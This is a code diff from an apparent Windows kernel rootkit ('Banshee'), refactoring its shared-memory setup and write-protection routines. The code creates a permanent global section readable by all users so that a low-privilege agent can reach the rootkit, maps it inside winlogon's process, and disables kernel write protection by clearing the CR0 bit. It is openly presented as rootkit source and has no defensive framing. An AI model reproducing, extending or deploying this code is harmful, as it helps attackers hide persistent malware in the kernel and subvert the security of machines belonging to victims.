@@ -16,49 +16,51 @@
 NTSTATUS 
 BeCreateSharedMemory()
 {
-	UNICODE_STRING sectionName;
-	RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\BeShared");
+	UNICODE_STRING       SectionName = { 0 };
+	PSECURITY_DESCRIPTOR Sd          = { 0 };
+	OBJECT_ATTRIBUTES    ObjAttr     = { 0 };
+	LARGE_INTEGER        SectionSize = { 0 };
+	KAPC_STATE			 Apc		 = { 0 };
+	NTSTATUS			 Status	     = STATUS_UNSUCCESSFUL;
+	SIZE_T				 ulViewSize  = sizeof(BANSHEE_PAYLOAD);
 
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
+	//
 	// Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
-	PSECURITY_DESCRIPTOR sd = { 0 };
-	BeCreateSecurityDescriptor(&sd);
-	OBJECT_ATTRIBUTES objAttributes = { 0 };
-	InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
-	
-	LARGE_INTEGER sectionSize = { 0 };
-    sectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);  
+	//
+	BeCreateSecurityDescriptor(&Sd);
+	InitializeObjectAttributes(&ObjAttr, &SectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, Sd);
+	SectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);
 
-	status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
-	if (status != STATUS_SUCCESS)
+	Status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &ObjAttr, &SectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+	if (!NT_SUCCESS(Status))
 	{
-		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", status);
-		ExFreePool(sd);
-		return status;
+		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", Status);
+		ExFreePool(Sd);
+		return Status;
 	}
 
-	SIZE_T ulViewSize = sizeof(BANSHEE_PAYLOAD);
-
+	//
 	// TODO: document
-	KAPC_STATE apc;
-	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
+	//
+	KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
 
-	status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
-	
-	if (status != STATUS_SUCCESS)
+	Status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
+	if (!NT_SUCCESS(Status))
 	{
-		LOG_MSG("Failed to map shared memory: 0x%X\n", status);
+		LOG_MSG("Failed to map shared memory: 0x%X\n", Status);
 		BeGlobals::pZwClose(BeGlobals::hSharedMemory);
-		KeUnstackDetachProcess(&apc);
-		ExFreePool(sd);
+		KeUnstackDetachProcess(&Apc);
+		ExFreePool(Sd);
 		return STATUS_UNSUCCESSFUL;
 	}
+
 	LOG_MSG("Mapped shared memory at 0x%llx\n", (ULONG_PTR)BeGlobals::pSharedMemory);
 
-	KeUnstackDetachProcess(&apc);
+	KeUnstackDetachProcess(&Apc);
 
-	ExFreePool(sd);
+	ExFreePool(Sd);
 	return STATUS_SUCCESS;
 }
 
@@ -66,9 +68,11 @@ BeCreateSharedMemory()
  * TODO
  */
 VOID 
-BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
+BeCloseSharedMemory(_In_ HANDLE HSharedMemory, _In_ PVOID pSharedMemory)
 {
+	//
 	// TODO: document
+	//
 	KAPC_STATE apc;
 	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
 
@@ -80,33 +84,37 @@ BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 
 	if (BeGlobals::hSharedMemory != NULL) 
 	{
-		BeGlobals::pZwClose(hSharedMemory);
-		hSharedMemory = NULL;
+		BeGlobals::pZwClose(HSharedMemory);
+		HSharedMemory = NULL;
 	}
 
 	KeUnstackDetachProcess(&apc);
 }
 
-// Disable write protection by setting cr0
+/**
+ * @brief Disable write protection by setting cr0
+ */
 KIRQL 
 WPOFFx64()
 {
-	KIRQL irql = KeRaiseIrqlToDpcLevel();
-	UINT64 cr0 = __readcr0();
-	cr0 &= 0xfffffffffffeffff;
-	__writecr0(cr0);
+	KIRQL Irql = KeRaiseIrqlToDpcLevel();
+	UINT64 Cr0 = __readcr0();
+	Cr0 &= 0xfffffffffffeffff;
+	__writecr0(Cr0);
 	_disable();
-	return irql;
+	return Irql;
 }
 
-// Enable write protection by setting cr0
+/** 
+ * @brief Enable write protection by setting cr0
+ */
 VOID 
-WPONx64(KIRQL irql)
+WPONx64(_In_ KIRQL irql)
 {
-	UINT64 cr0 = __readcr0();
-	cr0 |= 0x10000;
+	UINT64 Cr0 = __readcr0();
+	Cr0 |= 0x10000;
 	_enable();
-	__writecr0(cr0);
+	__writecr0(Cr0);
 	KeLowerIrql(irql);
 }
 
